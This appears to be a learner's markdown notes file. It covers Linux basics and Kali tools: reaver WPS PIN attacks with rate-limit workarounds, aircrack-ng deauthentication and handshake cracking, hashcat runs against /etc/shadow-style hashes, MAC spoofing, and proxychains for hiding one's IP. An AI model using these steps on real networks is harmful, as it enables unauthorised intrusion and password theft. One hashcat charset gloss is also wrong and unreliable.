bb# Linux Commands

# Linux Commands

`pwd`

- present working directory

`/`

- root directory

`cd ..`

- backwards

`ls`

- list files and folders

`ls /home/`

- path of home folder

`ls -la`

- list all files

`echo “ ”`

- write to screen or file

`echo “ ” > file.txt`

- creates file and writes to it

`cat`

- shows file content

`“tab”`

- autocomplete

`mkdir`

- make dir

`mv`

- move file (will rename it if put new name)

`rmdir`

- remove dir

`rm`

- remove file (can't recover things)

`cp`

- copy

`cp test.txt /home/`

- copy test.txt to dir /home

`cp -v`

- verbose - shows info

`locate`

- shows all files with that name

`updatedb`

- updates db for locate

`passwd`

- change password

`man`

- info about commands

`su`

- switch user

`whoami`

- show username

`hostname`

- show hostname

`grep`

- like filter
- `cat text.txt | grep src` only shows lines with src

</br>

#### Permissions (as in `ls -la`)

- `drwxr....`
  - directory
- `rwxr...`
  - file
- `rwx`
  - read, write (x)excute
- `1,2,3`
  - owner, group ownership, any user

</br>

#### Change Permissions

- `chmod 777`
  - full read write exec across board
- `chmod +r`
  - add read across board
- `chmod +w`
  - add write across board
- `chmod +x`

  - add execution across board

- `chown`

  - change ownership of file

- `adduser`
  - adds user

</br>

#### Passwords

`/etc/passwd`

- info on users (not password) - but can get INFO on users here

`/etc/shadow`

- password hashes

</br>

# Scripting with Bash

`grep`

- like filter
- (Finish this...)

`cut`

- (Finish this...)

`tr`

- (Finish this...)

## Script Writing

1.  for loops

- (Finish this...)

</br>

# Files

`echo`

- `echo “hello”`

  - to terminal

- `echo “hello” > hey.txt`

  - overwrites file

- `echo “hello” >> hey.txt`
  - appends file

`cat`

- display file content

replace vs append (> v >>)

- `>` (overwrite)
- `>>` (append)

`touch`

- `touch newfile.txt`
  - creates new empty file

`nano`

- editor (like vi, vim)
- `nano newfile.txt`
  - creates file and edits / or opens file to edit

`gedit`

- gui editor

</br>

# Kali Tools

## Bash Tools

### `ipsweep.sh`

1. `ipsweep.sh` takes first part of network ip <192.168.50> and loops through 1 - 254, pings each. Returns list of successful pings

- Example (puts output of ip addresses w successful pings to iplist.txt)

```bash
ipsweep.sh 192.168.50 > iplist.txt
```

2. CAN THEN... for ip in $(cat iplist.txt);

```bash
nmap -sS -p 80 -T4 $ip
```

- scans port 80 with nmap in stealth mode for each ip in out txt file. Shows which ports are open

</br>

## `nmap`

- Run in sudo
- Can use website domain or ip
  - Up Arrow
    - shows status of scan
  - -F
    - fast scan, fewer ports
  - -iL
    - can put file with ip adresses after this to scan those
    - ex: `nmap -iL ipaddresses.txt`

```bash
nmap -sT <ip>
```

- list of open ports

```bash
nmap --script vuln <ip>
```

- (finish this...)

</br>

## `wireshark`

- (Finish this...)

</br>

## `reaver`

Helps crack password in another way- it guesses at router pin that lets everyone connect (WPS)

- google: reaver google code
  - downloaded file
  - `./configure`
  - `make`
  - `make install`

Install...

- I had to install
  - libpcap-dev
  - libpcap0.8-dev
  - sqlite3
  - libsqlite3-dev
- but 1st had 2 remove half configured old driver (see Drivers) (actually had to deload)

Example...

```bash
reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv
```

- `-i`
  - interface
- `-b`
  - bssid
- `-vv`
  - very verbose

• see `crunch` under tools for password program downloaded

REAVER NOTES:

- there is a flaw in PIN - only numbers
- only digits - only 11,000 combos
- Also, reaver splits into 2 so works better
- this is not done locally - done remotely
  - we are trying to crack remotely using pin codes
  - many routers come with WPS enabled

CHANGE MAC ADDRESS for protection

- use `macchanger`

### Steps...

#### Preparation

1. use `macchanger` to change ur mac address
   - for protection
   - need `NetworkManager start` & `ifconfig wlan0 up`
   - ex: `macchanger -s wlan0` will show mac address
   - ex: `macchanger -a wlan0` will change to random address of same kind
2. `ifconfig wlan0 down`
   - taking wireless card offline
3. `airmon-ng start wlan0`
   - start card in monitor mode
4. `ifconfig wlan0 up`
   - restart network card
5. `airmon-ng check wlan0`
   - see processes running
6. `airmon-ng check kill`
   - kill processes
7. `airmon-ng check wlan0`
   - re-check - make sure no more processes

#### Exploring wireless

1.  `wash -i wlan0` (WiFi Protected Setup Scan Tool)
    - see access points and if WPS is locked
2.  `airomon-ng wlan0`
    - see AP & signal strength
3.  choose AP to attack based on AP WPS not locked & signal strength
4.  `reaver -b AP_MAC -i INTERFACE -vv`
    - ex: `reaver -b B0:BE:76:E0:3D:AB -i wlan0 -vv`
    - this starts reaver becoming associated w AP and trying pins
5.  PROBLEMS
    - If you get “[!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking” there may be ways around
    - Limit reaver so can only do a certain amount
      - add flag `-r 2:60` (means 2 tries per 60 sec). Can change tries or seconds
      - ex: `reaver -b B0:BE:76:E0:3D:AB -i wlan0 -r 2:60 -vv`

</br>

## `aircrack-ng`

1. Wireless sniffer and WEP/WPA-PSK key cracker. This is a whole package, a suite of tools. Another tool is reaver

2. **Monitor mode**

- Picks up packets sent from access point to devices, and devices to access point
- As opposed to other mode. Regular mode just pays attention to what is for them

3. TO START USING WIFI DEVICE IN MONITOR MODE

```bash
ip link
```

- Will show interface names on out system - mine is wlan0

```bash
sudo airmon-ng start wlan0
```

- Will show any processes to kill that could interfere. Kills NetworkManager

```bash
sudo airmon-ng check kill
```

- Kills the processes that can cause trouble

## **Step By Step**

1.  PUT DEVICE IN MONITOR MODE

```bash
airmon-ng start wlan0
```

- Start monitor mode (can do stop or restart)

---

2.  GET DATA FROM BROADASTING APs AND CLIENTS

- Gives 2 sections.
  - TOP is APs, with BSSID address, channel, authentication type, SSID name.
  - BOTTOM is clients and AP its connected to. THIS STEP IS SO YOU CAN SEE BSSID ADDRESSES, WIFI NAMES, AUTH TYPE & CHANNEL

```bash
airodump-ng wlan0
```

- Starts showing active info

---

3.  [TERMINAL 1] GET DATA FROM TARGET AP (example)

- This starts to record packets and capture info we need in diff files.

```bash
airodump-ng -c 2 --bssid B0:BE:76:E0:3D:AB -w rootdownPSK wlan0
```

---

4.  [TERMINAL 2] DEAUTHENTICATE CLIENT FROM AP

- Knock client off in hopes they re-establish with handshake and you capture hash

```bash
aireplay-ng --deauth 100 -a AP_MAC -c CLIENT-MAC wlan0
```

- Do this to try to force new handshake - will see hash in upper right of airodum-np terminal. it will be captured in .cap file

```bash
aireplay-ng --deauth -0 0 -a AP_MAC  wlan0
```

- This will deauthenticate ALL clients)

---

5.  [TERMINAL 3] RUN aircrack-ng WITH WORDLIST AND CAPTURED HASH FILE

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AP_MAC CAPTURE_FILE.cap
```

**Example...**

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b B0:BE:76:E0:3D:AB rootdownPSK-01.cap
```

YOU CAN ALSO DO WITH PASSWORD GENERATOR CRUNCH (instead of a dictionary)

```bash
crunch -t aircrack-ng -w - CAPFILE.cap -e ESSID
```

- This will load CPU and make it HOT

</br>

## `crunch`

1.  password generator

- can generate password lists
- can state length
- can insert fractions of passwords

2. Downloaded crunch from surgeforce.net

- then unzip, cd to folder, saw MakeFile so ran “make” then “make install”

3. TIP...

- password lists generated can become huge. Instead of saving the list then sending to aircrack-ng, can pipe to aircrack-ng to use on the fly

```bash
crunch 3 10 abcdefghijklmnopqrstuvwxyz1234567890 | aircrack-ng -w -
```

</br>

## `hashcat`

1.  Create a textfile with hashes to crack

- Can use MD5 hash generator to make some hashes to put in file
  - Or do in cli with...

```bash
echo -n password | md5sum | tr -d ‘  -’ >> hashes
```

- this appends md5 hash of password to hashes file
- -n removes new line at end

2.  I did mine in dir hashcrack, `target_hashes.txt`
3.  Use this wordlist

- `/usr/share/wordlists/rockyou.txt`

### Dictionary Attack

```bash
hashcat -m 0 -a 0 -o cracked.txt target_hashes.txt /usr/share/wordlists/rockyou.txt --potfile-disabled
```

- "--potfile-disabled" says not to use potfile that has already cracked passwords

```bash
cat /etc/shadow
```

- For hashed passwords in linux machine

**Example...**

```bash
kali:$y$j9T$dbdLlkl8KjktBABrnlTqt1$zU5idFYfrMXzTr53cthA5mqnJLKvYeefNLAVXLIdH8C:19323:0:99999:7:::
```

- before : is hash
- 19323 is days since password changed
- 0 is delay needed to change
- 99999 is password policy of how often must be changed
- 7 is warning days before expires
- after 1st empty colon - number of days till acct disabled after expired
- after 2nd empty colon - number of days since disabled
- after 3rd empty colon - reserved for future use

### Brutte Force

```bash
hashcat -m 0 -a 3 hash/file -1 ?l?s?d ?1?1?1?1?1?1?1?1?1 --increment-min 4
```

- `hashcat`: This is the command to invoke Hashcat.
- `-m 0`: This flag specifies the hash type. In this case, the value 0 represents MD5 hashing algorithm. -m flag is followed by the number 0 to indicate MD5 hash.
- `-a 3`: This flag specifies the attack mode. In this case, the value 3 represents a brute-force attack. A brute-force attack tries all possible combinations of characters until it finds the correct password.
- `hash/file`: This is the parameter that represents the hash or the file containing the hashes to be cracked. You should replace this with the actual hash or the file path.
- `-1 ?l?s?d`: This flag specifies the character set for the first position in the password. Here, `?l?s?d` represents lowercase letters, uppercase letters, and digits.
- `?1?1?1?1?1?1?1?1?1`: This is the placeholder for the mask that represents the structure of the password to be brute-forced. Each ?1 represents a position that can be filled with any character from the character set specified by the `-1` flag. In this case, the mask implies a password with a minimum length of 4 characters.
- `--increment-min 4`: This flag specifies the minimum length for the incremental mode. It means that after exhausting all combinations of the mask length specified previously, Hashcat will start incrementing the password length from 4 characters and continue the brute-force process.

</br>

## `macchanger`

- pending...

</br>

# Kali Services

Things like web server, ssh, database etc, starting and stopping services
eg, apache server

## `systemctl`

```bash
systemctl
```

- Enable or disable services to load on boot
- Permanently starts service (or stops) service
- Will start on each reboot
- Ex: Below enables the PostgreSQL service to start on system boot. Once enabled, the PostgreSQL service will be automatically started when the system boots up.

```bash
systemctl enable postgresql
```

</br>

## `services apache2 start`

```bash
services apache2 start
```

- Start web server
- ONLY for this session
- eg, pasteing our ip in firefox doesn't bring up page bc no web server running. BUT if we start apache2 service, then it works

- `/var/www/html/index.html` is where webserver hosts from. Say we want to hack a machine and put an html pointing back to us... can do it here. OR...

</br>

## `python3 -m http.server 8080`

Another way to spin up web server. Here we can use ANY FOLDER as the server folder

- For python...

```bash
python -m SimpleHTTPServer 8080
```

- For python3

```bash
python3 -m http.server 8080
```

</br>

## `proxychains`

1.  Proxychains give the ability to route traffic through series of proxyservers
    - Some tools don't allow, like metasploit
    - Just configure, don't need to install anything
2.  Free proxychains are not very stable.

    - And can take a long time to do things like scans

3.  Protocols...
    - HTTP, SOCKS4, SOCKS5
    - SOCKS5 is best

### dynamic chain

- used the most. the most stable. Most stable bc most people use free proxys.
- Dont have to be a-b-c-d in that order.
- Need this if using TOR. If you want to use Tor with proxychains, need Dynamic Chains

### Strict Chain

- Can only work if go through a-b-c-d in that order

### Random Chain

- Same as resetting your services (like way tor resets ip every 10 min)

### proxy-dns

- Need this so that dns requests dont give you away.
- If you just use proxychains, this doesn't hide address of dns server you use. If dns server is discovered, they can figure out your ip address

</br>

# Installing / Updating Tools

`apt-get`

- debian based installing & updating

`apt-get update`

- checks pre defined packages for updates

`apt-get upgrade`

- upgrades based on updated packages

`apt-get update && apt-get upgrade`

- both

## 2 WAYS TO INSTALL PACKAGES / TOOLS

`apt-get install [file]`

- install file
- Example...

```bash
apt-get install git
install git
```

OR...

1.  `git clone [git address]`
2.  run config setup (if present) to install

</br>

# Install WIFI Adapter Driver

- For kali linux machine

## 8812.au (awus1900)

apt-get update && apt-get upgrade

1.  `apt-get install linux-headers-$(uname -r)`

2.  `git clone https://github.com/aircrack-ng/rtl8812au`

3.  `cd rtl8812au`

4.  `sudo make dkms_install`

5.  `dkms status`

    - Will show driver

6.  reboot

    - unplug and replug wifi adapter

7.  `airmon-ng check kill`

8.  `service NetworkManager start`

9.  `iwconfig` (
    - will see wlan0

</br>

# Remove a `dkms` Driver

1.  `dkms status`

    - shows installed drivers

2.  `dkms remove -m <module_name> -v <module_version> --all`

    - removes from dkms

3.  `uname -r`

    - shows current ram kernal for kali

4.  `update-initramfs -u -k <kernel_version>`

    - rebuilds kernel

5.  reboot

</br>

# Network Commands

`ifconfig`

- network breakdown info for different interface types

`iwconfig`

- wireless adapter version of ifconfig

`ping [address]`

- ping and ip address over icmp

`ping [address]	-c 1`

- ping for count of 1

`arp -a`

- maps ip addresses (machine talks to) to mac addresses

`netstat -ano`

- display all active connections on machine and listening ports

`route`

- displays routing table

`traceroute`

- shows route taken to ip address
- ex: `traceroute google.com`

</br>

## WIFI Commands

`iwlist wlan0 scan`

- shows info on all SSID picked up

`nmcli dev wifi`

- NetworkMaager CLI
- shows SSID info in diff format

`nmcli dev wifi connect <AP-SSID> password <AP-password>`

- connects to wifi with SSID and password

`nmcli c`

- shows connections

(for “c up” and "c down" it needs to be in connection list)
`nmcli c up <connection>`

- connect to connection

`nmcli -a c up <connection>`

- connect to connection / ask for password

`nmcli c down <connection>`

- disconnect from connection

</br>
